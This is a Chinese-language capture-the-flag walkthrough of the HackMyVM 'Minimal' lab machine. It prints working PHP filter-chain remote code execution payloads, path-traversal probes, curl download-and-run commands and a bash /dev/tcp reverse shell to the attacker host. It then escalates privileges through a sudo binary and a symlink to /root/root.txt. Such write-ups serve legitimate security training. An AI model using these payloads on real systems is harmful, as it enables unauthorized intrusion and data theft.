# hmv_Minimal

# 0.简介

**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
**难度**：黄色
**目标 IP**：192.168.205.135
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
Nmap scan report for 192.168.205.135
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)

（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个

![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)

注册完之后，可以把一些商品加入购物车

![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)

当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。新网址可能会存在文件包含漏洞，我们帮他测试一下❐‿❑

```bash
http://192.168.205.135/shop_cart.php?action=/etc/passwd
http://192.168.205.135/shop_cart.php?action=../../../../etc/passwd
http://192.168.205.135/shop_cart.php?action=....//....//....//....//etc/passwd
http://192.168.205.135/shop_cart.php?action=php://filter/convert.base64-encode/resource=index
```

![image](https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e)

测试了四条，只有第四条有反应，我们继续尝试可不可以通过**PHP 过滤器链** 来执行命令

![image](https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75)

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
```

（☆ω☆*）可以执行，使用的是这个工具 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)。我们弹个shell回来

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=curl 192.168.205.141/shell.sh -o /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=chmod +x /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=bash%20/tmp/a.sh


┌──(kali㉿kali)-[~/test]
└─$ cat shell.sh
bash -i >& /dev/tcp/192.168.205.141/8888 0>&1                                   
```

成功弹回

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.135] 44534
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
www-data@minimal:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@minimal:/var/www/html$ sudo -l
Matching Defaults entries for www-data on minimal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on minimal:
    (root) NOPASSWD: /opt/quiz/shop
www-data@minimal:/var/www/html$ ls -la /opt/quiz/shop
-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop

```

能`读取、执行`，不能修改(×﹏×)。我们把文件拖去本地用**IDA**看看

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdi
  _DWORD v5[4]; // [rsp+10h] [rbp-20h] BYREF
  char *v6; // [rsp+20h] [rbp-10h]
  char *s; // [rsp+28h] [rbp-8h]

  strcpy((char *)v5, "results.txt");
  s = "Hey guys, I have prepared this little program to find out how much you know about me, since I have been your admin"
      "istrator for 2 years.";
  v6 = "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash";
  puts(
    "Hey guys, I have prepared this little program to find out how much you know about me, since I have been your adminis"
    "trator for 2 years.");
  puts(
    "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash");
  v5[3] = question_1(
            "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you d"
            "on't, you win trash");
  v5[3] += question_2(
             "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you "
             "don't, you win trash");
  v5[3] += question_3(
             "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you "
             "don't, you win trash");
  v3 = (__int64)v5;
  writeResults(v5, v5[3]);
  if ( v5[3] == 3 )
  {
    v3 = 3LL;
    print_prize(3LL);
  }
  if ( foo == 85 )
    wait_what(v3);
  return 0;
}
```

主要是实现了，让你回答3个问题，如果回答正确了，可以获得一个泰迪熊。我们尝试获取一下问题的答案

![image](https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103)

question_1的答案是`linux`

![image](https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867)

question_2的答案是`gfhts ufshfpjx`

![image](https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35)

question_3的答案是`hpok&qorn&vjsaohu`

![image](https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4)

第2和第3个是错的，可能是通过了加密，但是我没有系统的学过加密算法和逆向，所以只可以慢慢试了

先有收获的是第3个，是使用了**XOR**，我通过[cyberchef](https://cyberchef.org/)暴力破解获得了几个像密码的字符串

![image](https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b)

我通过提权获得的字典表

```bash
www-data@minimal:/tmp$ awk -F ": " '{print $2}' tmp2 
iqnj'pnso'wkr`nit
jrmi$smpl$thqcmjw
kslh%rlqm%uipblkv
ltko"ukvj"rnweklq
mujn#tjwk#sovdjmp
nvim with plugins
owhl!vhui!qmtfhor
`xgc.ygzf.~b{ig`}
ayfb/xf{g/czhfa|
bzea,{exd,|`ykeb
c{d`-zdye-}axjdc~
d|cg*}c~b*zfmcdy
e}bf+|bc+{g~lbex
f~ae(a|`(xd}oaf{
g`d)~`}a)ye|n`gz
x`{6ab~6fzcqxe
ya~z7`~c7g{bp~yd
zb}y4c}`|4dxas}zg
{c|x5b|a}5ey`r|{f
|d{2e{fz2b~gu{|a
}ez~3dzg{3cftz}`
~fy}0gydx0`|ewy~c
gx|1fxey1a}dvxb
phws>iwjv>nrkywpm
qivr?hvkw?osjxvql
rjuq<kuht<lpi{uro
sktp=jtiu=mqhztsn
tlsw:msnr:jvo}sti
umrv;lros;kwn|ruh
vnqu8oqlp8htmqvk
wopt9npmq9iul~pwj
```

写了个小脚本跑一下（AI辅助）

```bash
#!/bin/bash

password_file="/tmp/tmp2"

while IFS= read -r password; do
  echo "Trying password: $password"
  
  echo -e "$password\n" | sudo /opt/quiz/shop > /tmp/output.txt
  
  if grep -q "Correct!!" /tmp/output.txt; then
    echo "Password found: $password"
    break
  fi
done < "$password_file"
```

执行

```bash
www-data@minimal:/tmp$ bash b.sh 
Trying password: iqnj'pnso'wkr`nit
Trying password: jrmi$smpl$thqcmjw
Trying password: kslh%rlqm%uipblkv
Trying password: ltko"ukvj"rnweklq
Trying password: mujn#tjwk#sovdjmp
Trying password: nvim with plugins
Password found: nvim with plugins

```

第三个答案是：`nvim with plugins`

第二个的答案，细细品了一下，发现了一个"秘密"(第三个也可以通过这种方式获得加密的方法)
![image](https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356)

凯撒！！！

![image](https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d)

所以第二题的答案是：`bacon pancakes`

```bash
www-data@minimal:/opt/quiz$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HURRAY YOU HAVE FOUND ME
 _________________________________________________________
|\=========================================================\
||                                                         |
||        _        __        ___        __        _        |
||       ; `-.__.-'. `-.__.-'. .`-.__.-' .`-.__.-' :       |
||     _.'. . . . . . . . .,,,,,,,. . . . . . . . .`._     |
||   .'. . . . . . . . ,a@@@@@@@@@@@a, . . . . . . . .`.   |
||   `. . . . ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, . . . ,'   |
||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |
||   ,' . . .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  . . `.   |
||   `.. . . @@@%%a@@@@@@""@@@@@@@""@@@@@@a%%@@@ . . .,'   |
||     ). . . "@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@" . . .(     |
||   ,'. . . . . `@@@@@@@@SSS, ,SSS@@@@@@@@' . . . . .`.   |
||   `. . . . . . `@@@@@@@`SSS:SSS'@@@@@@@' . . . . . ,'   |
||     ) . . . . . `@@@@@@@sssssss@@@@@@@' . . . . . (     |
||   ,' . . . . . ,a@@a@@@@@@@@@@@@@@@a@@a, . . . . . `.   |
||   `.. . . . .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. . . . .,'   |
||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |
||   ,'. . . . @@@@@@a@@@@'   "   `@@@@a@@@@@@ . . . .`.   |
||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,'   |
||     ) . . . `@@@@@@@@@@@@a, ,a@@@@@@@@@@@@' . . . (     |
||   ,' . . . . .`@@@@@@@@@@a@a@a@@@@@@@@@@'. . . . . `.   |
||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;'   |
||     );;;;;;;,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,;;;;;;;(     |
||   ,;;;;;;;;a@%#%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |
||   `;;;;;;;;@@%%%%%%%%%%M@@";"@@M%%%%%%%%%%@@;;;;;;;;'   |
||     );;;;;;`@a%%%%%%%%mM";;;;;"Mm%%%%%%%%a@';;;;;;(     |
||   ,;;;;;;;;;;"@@@@@@@@";;;;;;;;;"@@@@@@@@";;;;;;;;;;,   |
||   `;;;;;;;;;;;;"""""";;;;;;;;;;;;;"""""";;;;;;;;;;;;'   |
||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |
||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:'    |
||       ~~~       ~~        ~~~        ~~        ~~~      |
||                     .=============.                     |
||                     |   Mr. Bear  :                     |
||                     `-------------'                     |
\|_________________________________________________________|


And now what??
```

来之不易的泰迪熊，然后再看下**IDA**这个泰迪熊怎么来的

![image](https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c)

![image](https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa)

是查看了`prize.txt`文件，那就简单了，创建一个**软链接**就好了

```bash
www-data@minimal:/opt/quiz$ ln -s prize.txt /root/root.txt
ln: failed to create symbolic link '/root/root.txt': Permission denied
```

蛙趣，没权限，等我回想了一下，好像要去家目录，之前看群主`ll04567`都可以实现，再试试

```bash
www-data@minimal:/var/www/html$ ln -s /root/root.txt prize.txt 
www-data@minimal:/var/www/html$ ls -al
total 64
drwxr-xr-x 4 www-data www-data 4096 Jan 14 08:56 .
drwxr-xr-x 3 root     root     4096 Nov  1  2023 ..
-rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php
-rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php
-rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 imgs
-rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php
-rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php
-rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php
lrwxrwxrwx 1 www-data www-data   14 Jan 14 08:56 prize.txt -> /root/root.txt
-rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php
-rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php
-rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php
-rw-r--r-- 1 root     root       18 Jan 14 07:58 results.txt
-rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt
-rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles
www-data@minimal:/var/www/html$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HMV{xxxxxxxxxxxxx} 

```

行了，下班

![006mowZngy1gd6j0zxr0tg30as0bctww](assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif)

# 5.后话

去看了其他大佬的[wp](http://162.14.82.114/index.php/574/04/16/2024/)，发现还可以使用**构造 ROP 链**的方式提权，感兴趣的可以去看`HGBE`大佬的[wp](http://162.14.82.114/index.php/574/04/16/2024/)